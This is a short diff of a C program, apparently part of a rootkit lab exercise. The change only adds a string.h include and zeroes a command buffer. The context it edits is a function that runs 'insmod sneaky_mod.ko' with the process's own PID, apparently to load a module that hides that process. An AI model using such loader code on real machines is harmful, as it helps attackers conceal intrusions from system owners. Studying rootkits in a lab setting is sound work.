@@ -1,6 +1,7 @@
 #include<stdio.h>
 #include<stdlib.h>
 #include <unistd.h>
+#include<string.h>
 
 void create_new_file(char * in_file, char * out_file) {
   FILE * fin = fopen(in_file, "r");
@@ -32,7 +33,8 @@ void append_to_file(char * file, char * content) {
 }
 
 void load_sneaky_module() {
-  char command[60]; 
+  char command[60];
+  memset(command, 0, 60);
   snprintf(command, 60, "insmod sneaky_mod.ko pid=%d", (int)getpid());
   int res = system(command);
   if (res == -1) {
